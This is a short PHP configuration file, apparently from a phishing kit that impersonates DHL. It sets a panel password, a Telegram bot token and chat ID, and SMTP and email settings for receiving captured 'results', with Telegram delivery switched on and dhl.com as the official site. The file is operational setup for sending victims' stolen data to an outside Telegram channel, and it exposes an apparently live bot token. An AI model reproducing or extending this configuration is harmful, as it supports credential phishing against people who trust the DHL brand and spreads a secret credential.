<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    session_start();
    error_reporting(0);
    require_once 'func.php';
    require_once 'BrowserDetection.php';
    require_once 'lang.php';

    define("PASSWORD", 'dhl');

    define("TELEGRAM_TOKEN", '6024494888:AAEYDXT76RUuEhakPfj9cayRZf09bQfApew');
    define("TELEGRAM_CHAT_ID", '-891711149');

    define("RECEIVER", 'your@email.com');

    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');

    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1

    define("OFFICIAL_WEBSITE", 'https://www.dhl.com/');

?>